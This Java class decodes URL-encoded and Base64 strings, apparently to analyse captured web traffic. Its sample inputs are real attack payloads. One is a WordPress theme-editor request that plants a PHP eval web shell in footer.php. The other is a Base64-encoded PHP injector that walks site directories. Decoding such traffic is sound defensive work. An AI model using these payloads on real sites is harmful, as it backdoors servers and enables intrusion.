package com.air.data;

import java.io.UnsupportedEncodingException;
import java.net.URLDecoder;

import sun.misc.BASE64Decoder;
import sun.misc.BASE64Encoder;

public class Base64UrlencodeTest {
	
	public static void main(String[] args) throws Exception {
		final String separators = "[`~!@#$%^&*()+=\\-{}\\[\\]|\\:;\"<>',.?/\\\\ \n\r\t]";
		String base64="p2=ZWNobyAibWFya2VyOjRiM2RiMmFkYTI4OGVmMWNkNzdjZGVhN2U3NmZmYzZmXG4iOyANCg0KJGRlcHRoID0gMjsNCg0KJGJhc2VfZGlyID0gZGlybmFtZShfX0ZJTEVfXyk7DQpmb3IgKCRpID0gMDsgJGkgPCAkZGVwdGg7ICRpKyspIHsNCiAgICAkZCA9IGRpcm5hbWUoJGJhc2VfZGlyKTsNCiAgICAkdG1wID0gZ2xvYigkZCAuICIvKiIsIEdMT0JfT05MWURJUik7DQogICAgaWYoY291bnQoJHRtcCk%2BMCkNCiAgICAgICAgJGJhc2VfZGlyID0gJGQ7DQogICAgZWxzZSB7DQogICAgICAgIGVjaG8oImNhbnQgcmVhZDogIi4kZC4iXG4iKTsNCiAgICB9DQp9DQoNCiR0ZW1wbGF0ZXNfYXJyYXkgPSAKYXJyYXkoCiAgICAwPT5hcnJheSgKICAgICAgICAiaW5qZWN0Ij0%2BJ0NtWjFibU4wYVc5dUlHMTVYM1JwYldVb0pHUnBjaWtnZXdvZ0lDQWdabTl5WldGamFDQW9aMnh2WWlna1pHbHlJQzRnSnk5M2NDMHFMbkJvY0NjcElHRnpJQ1JtS1NCN0NpQWdJQ0FnSUNBZ0pIUnBiV1Z6VzEwZ1BTQm1hV3hsYlhScGJXVW9KR1lwT3dvZ0lDQWdmUW9nSUNBZ0pHMWhlQ0E5SURFN0NpQWdJQ0JtYjNJZ0tDUnBJRDBnTURzZ0pHa2dQQ0JqYjNWdWRDZ2tkR2x0WlhNcElDMGdNVHNnSkdrckt5a2dld29nSUNBZ0lDQWdJQ1JySUQwZ01Uc0tJQ0FnSUNBZ0lDQm1iM0lnS0NScUlEMGdKR2tnS3lBeE95QWthaUE4SUdOdmRXNTBLQ1IwYVcxbGN5azdJQ1JxS3lzcElIc0tJQ0FnSUNBZ0lDQWdJQ0FnYVdZZ0tDUjBhVzFsYzFza2FWMGdQVDBnSkhScGJXVnpXeVJxWFNrZ";
		String urlencode="_wpnonce=&_wp_http_referer=%2Fwp%2Fwp-admin%2Ftheme-editor.php%3Ffile%3Dfooter.php%26theme%3Dtwentytwelve&newcontent=<?php @eval($_POST['LrCXw']);?>&action=update&file=footer.php&theme=twentytwelve&scrollto=0";
//		List<Pair<byte[], byte[]>> plist = QueryString.query_string(base64.getBytes());
//		for (Pair<byte[], byte[]> p : plist) {
//			byte[] key = Unquote.unquote(p.first);
//		    byte[] value = Unquote.unquote(p.second);
//			System.out.println(key);
//			System.out.println(value);
//		}
		String postdata2 = urlencode.replaceAll("%", "%25"); 
		String keyWord = URLDecoder.decode(urlencode, "UTF-8");  
		
//		String moreURL = new String(urlencode.getBytes("ISO8859-1"), "GB2312");	
	       System.out.println(URLDecoder.decode(keyWord, "UTF-8"));  
//        String[] tokens = keyWord.split(separators);
//        System.out.println(tokens.length);
//		String base64decode="";
//		for (int i = 0; i < tokens.length; i++) {
//			String da = tokens[i];
//			try {
//				String decoded = Base64.decode(da, "UTF-8");
//				base64decode=base64decode+decoded;
////		        System.out.println(decoded);  
//			} catch (Exception e) {
//				base64decode=base64decode+da;
////				 System.out.println(da);  
//			}
//		}
//		System.out.println(base64decode);
//		String keyWord = URLDecoder.decode(urlencode, "UTF-8");  
//        System.out.println(keyWord);  
//		String decoded = Base64.decode(base64, "UTF-8");
//        System.out.println(decoded);  
//        System.out.println(getFromBase64(base64) 	);  
	}
    /**
     * 编码是否有效
     * @param text
     * @return
     */
     private static boolean Utf8codeCheck(String text){
     String sign = "";
     if (text.startsWith("%e"))
     for (int i = 0, p = 0; p != -1; i++) {
     p = text.indexOf("%", p);
     if (p != -1)
     p++;
     sign += p;
     }
     return sign.equals("147-1");
     }
	  /**
     * utf8URL编码转字符
     * @param text
     * @return
     */
     private static String CodeToWord(String text) {
     String result;
     if (Utf8codeCheck(text)) {
     byte[] code = new byte[3];
     code[0] = (byte) (Integer.parseInt(text.substring(1, 3), 16) - 256);
     code[1] = (byte) (Integer.parseInt(text.substring(4, 6), 16) - 256);
     code[2] = (byte) (Integer.parseInt(text.substring(7, 9), 16) - 256);
     try {
     result = new String(code, "UTF-8");
     }catch (UnsupportedEncodingException ex) {
     result = null;
     }
     }
     else {
     result = text;
     }
     return result;
     }
	
    /**
     * Utf8URL解码
     * @param text
     * @return
     */
     public static String Utf8URLdecode(String text) {
     String result = "";
     int p = 0;
     if (text!=null && text.length()>0){
     text = text.toLowerCase();
     p = text.indexOf("%e");
     if (p == -1) return text;
     while (p != -1) {
     result += text.substring(0, p);
     text = text.substring(p, text.length());
     if (text == "" || text.length() < 9) return result;
     result += CodeToWord(text.substring(0, 9));
     text = text.substring(9, text.length());
     p = text.indexOf("%e");
     }
     }
     return result + text;
     }
	  // 解密  
    public static String getFromBase64(String s) {  
        byte[] b = null;  
        String result = null;  
        if (s != null) {  
            BASE64Decoder decoder = new BASE64Decoder();  
            try {  
                b = decoder.decodeBuffer(s);  
                result = new String(b, "UTF-8");  
            } catch (Exception e) {  
                e.printStackTrace();  
            }  
        }  
        return result;  
    }  
    public static String getBase64(String str) {  
        byte[] b = null;  
        String s = null;  
        try {  
            b = str.getBytes("utf-8");  
        } catch (UnsupportedEncodingException e) {  
            e.printStackTrace();  
        }  
        if (b != null) {  
            s = new BASE64Encoder().encode(b);  
        }  
        return s;  
    }  

}
